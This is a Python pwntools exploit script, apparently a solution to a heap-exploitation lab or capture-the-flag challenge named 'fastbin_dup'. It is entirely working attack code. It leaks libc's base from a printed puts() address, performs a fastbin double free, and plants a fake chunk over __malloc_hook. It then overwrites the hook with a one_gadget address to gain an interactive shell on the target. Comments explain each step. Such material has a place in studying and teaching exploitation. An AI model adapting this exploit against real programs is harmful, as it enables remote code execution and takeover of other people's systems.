#!/usr/bin/env python2.7


from pwn import *

BINARY = './fastbin_dup'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0
# one_gadget found in this version of glibc using david942j/one_gadget
ONE_GADGET_OFFSET = 0xe1fa1


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size, data):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def free(io, index):
    io.send("2")
    io.sendafter("index ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()
    io.timeout = 0.1

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    one_gadget = libc.address + ONE_GADGET_OFFSET
    log.info("one_gadget found at: " + hex(one_gadget))

    username = [
        0xdeadbeefcafebabe
    ]
    io.sendafter("Enter your username: ", flat(username))
    io.recvuntil("> ")

    # Allocate two chunks.
    chunk_a = malloc(io, 0x68, cyclic(0x68, n=8))
    chunk_b = malloc(io, 0x68, cyclic(0x68, n=8))

    """
    Since chunk_a is not at the head of the Fastbin, we can use this double
    free to free chunk_a again, making it the head of the Fastbin.
    """
    free(io, chunk_a)
    free(io, chunk_b)
    free(io, chunk_a)

    """
    Allocate chunk_a and overwrite its forward pointer to point to a fake
    chunk that overlaps the __malloc_hook. We use the offset of 35 bytes to
    use the existing, valid size field located nearby. This is discovered using
    the pwndbg `find_fake_fast` command.
    """
    fastbin_dup = malloc(io, 0x68, p64(libc.sym.__malloc_hook - 35))

    # Clear the fastbin until we reach our target chunk.
    malloc(io, 0x68, cyclic(0x68, n=8))
    malloc(io, 0x68, cyclic(0x68, n=8))

    """
    Allocate the fake chunk overlapping our __malloc_hook target and overwrite
    the __malloc_hook symbol with our one_gadget. We use 19 bytes of junk data
    to account for our misalignment, etc.
    """
    payload = [
        cyclic(19, n=8),
        one_gadget
    ]
    malloc(io, 0x68, flat(payload))

    # Execute malloc which executes the one_gadget, giving us RCE.
    malloc(io, 0x68, "")
    io.interactive()


if __name__ == "__main__":
    solve()
